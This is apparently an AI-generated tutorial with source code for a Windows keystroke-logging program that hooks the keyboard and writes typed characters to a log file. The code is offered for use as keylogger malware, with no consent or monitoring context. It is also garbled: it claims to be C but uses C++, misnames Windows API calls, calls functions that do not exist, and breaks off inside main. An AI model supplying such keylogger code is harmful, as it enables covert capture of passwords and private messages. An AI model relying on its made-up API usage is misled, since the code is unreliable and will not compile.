Here is a step-by-step explanation of how to create a keystroke-logging application in C for Windows:

1. **Include Necessary Headers**: Use `#include <Windows.h>` and `#include <Wincon.h>` for Windows API functions.

2. **Define Data Types and Constants**: 
   - `HWND hwnd` for window handle.
   - `HHOOK hHook` for hook handle.
   - `DWORD dwAsynchronous` to track asynchronous events.
   - `static int g_bHookInstalled` to track if the hook is installed.
   - `HANDLE hFile` for the file handle to log keystrokes.
   - `FILE *f` for file pointer.
   - `static int g_keyCount` to count keystrokes.

3. **Initialize the Keystroke Logger**: Create a function `void InitializeKeystrokeLogger()` to set up the log file and prepare for hook installation.

4. **Install the Keyboard Hook**: Use `SetWindowsHook` with `WH_KEYBOARD_LL` to install the keyboard hook. Check for errors with `GetLastError`.

5. **Set Up the Hook Function**: Define `void KeyStrokeHookProc(int nCode, WPARAM wParam, LPARAM lParam)` to handle keyboard events. Use `GetKeyState` to check key states.

6. **Check Key States**: Use `GetKeyState` to check if a key is pressed or released. Determine if it's a printable character using `IsKeyDown` and `IsKeyUp`.

7. **Log Keystrokes**: Append each printable character to the log file using `fputs` and `fseek` to ensure data is written correctly.

8. **Remove the Hook**: Use `UnhookWindowsHook` when the program exits or when the hook should be removed.

9. **Handle Termination**: Use `UnhookWindowsHook` in `Exit` to clean up resources.

10. **Compile and Run**: Compile the code as a console application.

Here's the code:

```c
#include <Windows.h>
#include <Wincon.h>
#include <iostream>
#include <fcntl.h>
#include <io.h>

using namespace std;

HWND hwnd = 0;
HHOOK hHook = 0;
DWORD dwAsynchronous = 0;
HANDLE hFile = 0;
FILE *f = nullptr;
static int g_bHookInstalled = 0;
static int g_keyCount = 0;

void InitializeKeystrokeLogger()
{
    // Create the log file
    hFile = CreateFile("keystroke.log", GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_APPEND_MODE, 0);
    if (hFile == nullptr)
    {
        cout << "Error: Cannot create keystroke.log file." << endl;
        return;
    }
    f = fileHandle = fopen("keystroke.log", "a");
    if (f == nullptr)
    {
        cout << "Error: Cannot open keystroke.log file." << endl;
        return;
    }
}

void KeyStrokeHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (g_bHookInstalled != 0)
    {
        // Check if the event is for the main window
        if (hwnd != GetForegroundWindow())
        {
            return;
        }

        // Get the key state
        DWORD dwKeyState = GetKeyState(0);

        // Check if the key is pressed
        if ((dwKeyState & 0x1) != 0)
        {
            // Key is pressed
            if (wParam == WM_KEYDOWN)
            {
                // Check for modifier keys
                if ((wParam == VK_SHIFT) || (wParam == VK_CONTROL) || (wParam == VK_MENU))
                {
                    // Modifier keys don't produce characters, so don't log
                    return;
                }

                // Get the key code
                int vk = wParam;
                if (IsKeyDown(vk))
                {
                    char c = 0;
                    if (GetCharFromVk(vk, &c)
                        && (IsKeyDown(vk) && IsVisible(vk)))
                    {
                        // Write to file
                        fputc(c, f);
                        cout << c;
                        g_keyCount++;
                    }
                }
            }
        }
        // Check if the key is released
        else if ((dwKeyState & 0x2) != 0)
        {
            // Key is released
        }
    }
}

void Exit()
{
    // Remove the hook
    if (hHook)
    {
        UnhookWindowsHook(hHook, dwAsynchronous);
        hHook = 0;
        g_bHookInstalled = 0;
    }

    // Close the file
    if (f)
    {
        fclose(f);
        hFile = 0;
    }
}

int main()
{
    // Initialize the log file
    InitializeKeystrokeLogger();

    // Get the main window handle
    hwnd = GetForegroundWindow(0);

    // Install the keyboard hook
    hHook = SetWindowsHook(WH_KEYBOARD_LL, KeyStrokeHookProc);
    if (hHook == 0)
    {
        cout << "Error: Could not install keyboard hook." << endl;
        return 1;
    }

    g_bHookInstalled = 1;

    // Start the hook
    dwAsynchronous = 0;

    // Wait for keystrokes
    while (g_bHookInstalled)
    {
        Sleep(100);
    }

    // Exit
    Exit();

